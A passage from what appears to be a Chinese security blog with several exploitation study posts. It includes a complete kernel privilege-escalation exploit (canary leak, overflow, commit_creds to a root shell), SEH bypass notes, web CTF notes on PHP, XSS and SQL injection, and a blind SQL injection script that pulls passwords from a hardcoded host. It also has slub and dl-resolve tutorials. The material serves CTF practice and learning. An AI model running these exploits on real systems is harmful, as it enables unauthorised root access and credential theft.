class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>还和之前一样，编译后，丢busybox文件系统，
然后qemu起系统，之后测试我们的dump程序是否工作正常
h可以看到，我们的dump程序可以正常dump出CANARY的值，
那么下面的工作就很简单了，直接可以利用这个leak，构造payload去拿root shell了。
</code></pre><h1 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 : Exploit"></a>0x04 : Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span></span><br><span class="line">        <span class="string">"pushfl; popl tf+8;"</span></span><br><span class="line">        <span class="string">"pushl %esp; popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss; popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">       <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">84</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">76</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(poc+<span class="number">64</span>,canary,<span class="number">4</span>);<span class="comment">//set canary</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]payload:%sn"</span>,poc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    <span class="comment">//init tf struct;</span></span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,<span class="number">76</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.125Z"><a href="/2018/10/21/windows机制/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/windows机制/">windows机制</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="seh机制"><a href="#seh机制" class="headerlink" title="seh机制"></a>seh机制</h2><pre><code>seh是异常处理程序在eip下方，为单向链表
一直到最后一个函数
sehsafe是windows后加的安全机制
通过检测seh函数地址是否为预先设定的地址来防止溢出
但 没开启sehsafe的函数 加载模块之外的地方 堆区均可无视sehsafe 
可以利用这个特点进行绕过 
sehop检测链表最后一个函数是不是默认处理函数可以伪造链表绕过
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.124Z"><a href="/2018/10/21/windbg学习总结/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/windbg学习总结/">windbg学习总结</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="无法正确输出地址问题"><a href="#无法正确输出地址问题" class="headerlink" title="无法正确输出地址问题"></a>无法正确输出地址问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadMemory error for address eeddccee</span><br><span class="line">Use `!address eeddccee&apos; to check validity of the address.</span><br></pre></td></tr></table></figure>
<h1 id="无法正确断下点问题"><a href="#无法正确断下点问题" class="headerlink" title="无法正确断下点问题"></a>无法正确断下点问题</h1><pre><code>address命令正确的指示了该地址为私有堆内存，但该内存页不可访问。
检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options，确定已经正确的设置了，
尝试其他多种设置，甚至换工具进行设置，但结依然如此。
难道是机器问题？于是在win732位机器上重复上述过程，
发现是可以正确的打印出堆内存指针被释放的栈回溯的。
但更换其他xp机器依然不能正确显示。
&quot;CTEST* pCTest = new CTEST(); &quot;的栈回溯几率，
即申请堆内存的记录，但始终未找到释放堆内存的记录。
于是再次怀疑xp下的页堆并没有真正启动或启动是有问题的，
于是检查下页堆启动情况：
“ReadMemory error for address eeddccee”，  
且只展示一个Page Heap句柄了，剩下的未展示完全，
但页堆明明白白的现实已经开启，也有了准页堆，
但数据却显示不出来，说明数据可能被破坏，
但测试代码如此简单，而且也被windbg第一时间断下，
不可能去破坏数据，换成6.6.0007.5版即可解决。
试了下果然在xp下顺利输出了用户态栈回溯。
Win7下的 _STACK_TRACE_DATABASE 结构和xp下并不完全相同，
关键的 Buckets（栈回溯记录）的结构偏移改了，
而且原xp下是个数组，但win7下却变成了链表，
故猜测高版本的Windbg在xp下依然使用了win7下的某些数据结构，
从而导致Windbg解析出了问题。
</code></pre><h2 id="无法正确下堆断点"><a href="#无法正确下堆断点" class="headerlink" title="无法正确下堆断点"></a>无法正确下堆断点</h2><pre><code>peb错误
输入如下代码
就可以！gflag
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath srv*C:\symblol*http://msdl.microsoft.com/download/symbols </span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>
<h2 id="active控件分析方法"><a href="#active控件分析方法" class="headerlink" title="active控件分析方法"></a>active控件分析方法</h2><pre><code>alt+e进入oleaut32
ctrl+n 找到DISPCALLFUNC
找到首个 call ecx
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.122Z"><a href="/2018/10/21/web/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/web/">随意码的web</a></h1>
  

    </header>
    <div class="entry">
      
        <p>信息收集</p>
<p>.git</p>
<p>.svn</p>
<p>.robots.txt</p>
<p>.swp vim的暂存</p>
<p>压缩文件</p>
<p>php</p>
<p>变量覆盖</p>
<p>extract()</p>
<p>$$k</p>
<p>trim去掉空格 除了0xf</p>
<p>parse_str()解析字符串为变量</p>
<p>== 类型不一定等 ===类型也要等</p>
<p>sha1加密失败返回NULL</p>
<p>switch没有break</p>
<p>array转换int 0或者1 </p>
<p>0e科学计数法</p>
<p>ox 或者0x开头字符串等于16进制</p>
<p>%00截断</p>
<p>两个number可以绕过后一个</p>
<p>php伪协议</p>
<p>a=data:text/plain,&lt;?php&gt;</p>
<p>php://input enctype=”multipart/from-data”无效</p>
<p>php://filter/read=string.tolower/resource=test.php</p>
<p>include_once(“flag.php”);</p>
<p>反序列化</p>
<p>session反序列化 上传名字为序列化的文件</p>
<p>hackbar</p>
<p>xss </p>
<p>绕过</p>
<p>“data:text/javascript，alert(3);”</p>
<p>us-ascii</p>
<p>utf-7</p>
<p>multi-byte gbl</p>
<p>宽字节</p>
<p>%3c%27 alert(1) //</p>
<p>反序列化</p>
<p>session反序列化可以先创建个文件在远程</p>
<pre><code>                                  table_scnema

column                     table_name

                              column_name
</code></pre><p>desc   information_schema  {                         schemata                   schem_name</p>
<pre><code>tables                table_schema

                        table_name     
</code></pre><p>?id=1’ and ord(mid(‘select table_name   from information_schema.tables limit 1,1’,1,1))&gt;11%23</p>
<p>import requests</p>
<p>import base64</p>
<p>import time</p>
<p>import string</p>
<p>print ‘a’</p>
<p>def send(url,key1,value1):</p>
<pre><code>value1 = base64.b64encode(value1)


data = {


    key1:value1,


}


response = requests.post(url,data=data)


content = response.content





if &quot;Alix&quot; in content:


    return True


else:


    return False
</code></pre><p>str = string.printable</p>
<p>def main():</p>
<pre><code>found = &quot;&quot;


for i in range(1, 80):





    for j in range(1, 123):






        _username = &quot;nothing&apos; or ascii(mid((select group_concat(password) from users), %d, 1))=%d#&quot; % (i, j)






        _password=&quot;amin&quot;


        print _username


        if send(&apos;http://128.199.224.175:24000/&apos;, &apos;spy_name&apos;,_username):


            found +=chr(j)


            print found


            break
</code></pre><p>main()</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.120Z"><a href="/2018/10/21/sulb/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/sulb/">slub</a></h1>
  

    </header>
    <div class="entry">
      
        <p>slub机制彻底图解分析<br>转载 2017年01月27日 08:57:17标签：slub机制 /slab机制 /linux /kernel /内存管理1333</p>
<pre><code>内核管理页面使用了2个算法：伙伴算法和slub算法，伙伴算法以页为单位管理内存，但在大多数情况下，程序需要的并不是一整页，而是几个、几十个字节的小内存。于是需要另外一套系统来完成对小内存的管理，这就是slub系统。slub系统运行在伙伴系统之上，为内核提供小内存管理的功能。

 slub把内存分组管理，每个组分别包含2^3、2^4、...2^11个字节，在4K页大小的默认情况下，另外还有两个特殊的组，分别是96B和192B，共11组。之所以这样分配是因为如果申请2^12B大小的内存，就可以使用伙伴系统提供的接口直接申请一个完整的页面即可。

 slub就相当于零售商，它向伙伴系统“批发”内存，然后在零售出去。一下是整个slub系统的框图：



  一切的一切源于kmalloc_caches[12]这个数组，该数组的定义如下：
</code></pre><pre><code>struct kmem_cache kmalloc_caches[PAGE_SHIFT] __cacheline_aligned;
</code></pre><pre><code>每个数组元素对应一种大小的内存，可以把一个kmem_cache结构体看做是一个特定大小内存的零售商，整个slub系统中共有12个这样的零售商，每个“零售商”只“零售”特定大小的内存，例如：有的“零售商”只&quot;零售&quot;8Byte大小的内存，有的只”零售“16Byte大小的内存。

每个零售商(kmem_cache)有两个“部门”，一个是“仓库”：kmem_cache_node，一个“营业厅”：kmem_cache_cpu。“营业厅”里只保留一个slab，只有在营业厅(kmem_cache_cpu)中没有空闲内存的情况下才会从仓库中换出其他的slab。
所谓slab就是零售商(kmem_cache)批发的连续的整页内存，零售商把这些整页的内存分成许多小内存，然后分别“零售”出去，一个slab可能包含多个连续的内存页。slab的大小和零售商有关。
</code></pre><p>相关数据结构：</p>
<pre><code>    物理页按照对象(object)大小组织成单向链表，对象大小时候objsize指定的。例如16字节的对象大小，每个object就是16字节，每个object包含指向下一个object的指针，该指针的位置是每个object的起始地址+offset。每个object示意图如下：


void*指向的是下一个空闲的object的首地址，这样object就连成了一个单链表。
向slub系统申请内存块(object)时：slub系统把内存块当成object看待

slub系统刚刚创建出来，这是第一次申请。    
此时slub系统刚建立起来，营业厅(kmem_cache_cpu)和仓库(kmem_cache_node)中没有任何可用的slab可以使用，如下图中1所示：
因此只能向伙伴系统申请空闲的内存页，并把这些页面分成很多个object，取出其中的一个object标志为已被占用，并返回给用户，其余的object标志为空闲并放在kmem_cache_cpu中保存。kmem_cache_cpu的freelist变量中保存着下一个空闲object的地址。上图2表示申请一个新的slab，并把第一个空闲的object返回给用户，freelist指向下一个空闲的object。

slub的kmem_cache_cpu中保存的slab上有空闲的object可以使用。
这种情况是最简单的一种，直接把kmem_cache_cpu中保存的一个空闲object返回给用户，并把freelist指向下一个空闲的object。


slub已经连续申请了很多页，现在kmem_cache_cpu中已经没有空闲的object了，但kmem_cache_node的partial中有空闲的object 。所以从kmem_cache_node的partial变量中获取有空闲object的slab，并把一个空闲的object返回给用户。


kmem_cache_cpu中已经都被占用的slab放到仓库中，kmem_cache_node中有两个双链表，partial和full，分别盛放不满的slab(slab中有空闲的object)和全满的slab(slab中没有空闲的object)。然后从partial中挑出一个不满的slab放到kmem_cache_cpu中。

kmem_cache_cpu中中找出空闲的object返回给用户。


slub已经连续申请了很多页，现在kmem_cache_cpu中保存的物理页上已经没有空闲的object可以使用了，而此时kmem_cache_node中没有空闲的页面了，只能向内存管理器(伙伴算法)申请slab。并把该slab初始化，返回第一个空闲的object。


kmem_cache_node中没有空闲的object可以使用，所以只能重新申请一个slab。



把新申请的slab中的一个空闲object返回给用户使用，freelist指向下一个空闲object。
向slub系统释放内存块(object)时，如果kmem_cache_cpu中缓存的slab就是该object所在的slab，则把该object放在空闲链表中即可，如果kmem_cache_cpu中缓存的slab不是该object所在的slab，然后把该object释放到该object所在的slab中。在释放object的时候可以分为一下三种情况：

object在释放之前slab是full状态的时候（slab中的object都是被占用的），释放该object后，这是该slab就是半满（partail）的状态了，这时需要把该slab添加到kmem_cache_node中的partial链表中。



slab是partial状态时（slab中既有object被占用，又有空闲的），直接把该object加入到该slab的空闲队列中即可。
该object在释放后，slab中的object全部是空闲的，还需要把该slab释放掉。
这一步产生一个完全空闲的slab，需要把这个slab释放掉。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.118Z"><a href="/2018/10/21/rtd/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/rtd/">return to dl-resolve</a></h1>
  

    </header>
    <div class="entry">
      
        <p>我们都知道，ELF在执行时，许多函数的地址是lazy binding的，即在第一次调用时才会解析其地址并填充至.got.plt。对于具体这一解析过程是如何完成的，之前并不怎么了解，只知道是在.plt中完成。其实之前Tiger有告诉我有一个名为roputils的工具，利用的就是构造所需信息，直接解析得到system的地址进而ROP。但直到最近才去研究其代码，搞明白这一技术，即return to dl-resolve，具体是怎么回事。</p>
<p>关于这一技术，在phrack的某一期有具体介绍。在此，我们首先以32位为例，阐述其基本原理；之后则会分析64位环境下这一技术的一些注意点。</p>
<p>32位环境下return to dl-resolve<br>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。其内容示例如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d bof32</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x614 contains 24 entries:</span><br><span class="line">Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x80482b0</span><br><span class="line">0x0000000d (FINI)                       0x80484f4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x8049608</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x804960c</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x804818c</span><br><span class="line">0x00000005 (STRTAB)                     0x804820c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481ac</span><br><span class="line">0x0000000a (STRSZ)                      80 (bytes) 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x8049700</span><br><span class="line">0x00000002 (PLTRELSZ)                   32 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x8048290</span><br><span class="line">0x00000011 (REL)                        0x8048288</span><br><span class="line">0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x6ffffffe (VERNEED)                    0x8048268</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x804825c</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure></p>
<p>其中的JMPREL segment，对应于.rel.plt section，是用来保存运行时重定位表的。它与.rel.dyn类似，只不过.rel.plt是用于函数重定位，.rel.dyn是用于变量重定位。具体地，其内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r bof32</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.dyn&apos; at offset 0x288 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">080496fc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section &apos;.rel.plt&apos; at offset 0x290 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804970c  00000107 R_386_JUMP_SLOT   00000000   read</span><br><span class="line">08049710  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__</span><br><span class="line">08049714  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main</span><br><span class="line">08049718  00000407 R_386_JUMP_SLOT   00000000   write</span><br></pre></td></tr></table></figure></p>
<p>可以看到，.rel.plt里包含4个条目。事实上，之前.dynamic section中的PLTRELSZ即为.rel.plt的总大小，32 bytes；PLTREL则指明这些条目的类型为REL；RELENT指明了每个REL类型条目的大小，8 bytes。于是32/8=4即为条目个数。</p>
<p>这些条目的类型是Elf32_Rel，其定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br></pre></td></tr></table></figure></p>
<p>我们以.rel.plt第一条，即read的条目为例，对比调试器显示的结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/2x 0x8048290</span><br><span class="line">0x8048290:      0x0804970c      0x00000107</span><br></pre></td></tr></table></figure></p>
<p>显示的结果与之前$ readelf -r的结果是相符的。具体地，r_offset即为该函数在.got.plt中的地址:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read</span><br><span class="line">0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br></pre></td></tr></table></figure></p>
<p>而r_info则保存的是其类型和符号序号。根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；其symbol index则为RLF32_R_SYM(r_info)=1。</p>
<p>注意到之前$ readelf -r所得到的结果中，包含有Sym.Value和Sym. Name信息。而这些信息就是通过symbol index找到的。具体地，.dynamic section中的SYMTAB，即.dynsym section，保存的便是相关的符号信息。每一条symbol信息的大小在SYMENT中体现，为16 bytes。通过$ readelf -s来查看其内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s bof32</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 6 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)</span><br><span class="line">     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br><span class="line">     5: 0804850c     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used</span><br><span class="line"></span><br><span class="line">Symbol table &apos;.symtab&apos; contains 74 entries:</span><br></pre></td></tr></table></figure></p>
<p>(注意我们这里只看.dynsym，因为它是运行时所需的。诸如export/import的符号信息全在这里。而.symtab是编译时的符号信息，这部分在strip之后会被删除掉。)</p>
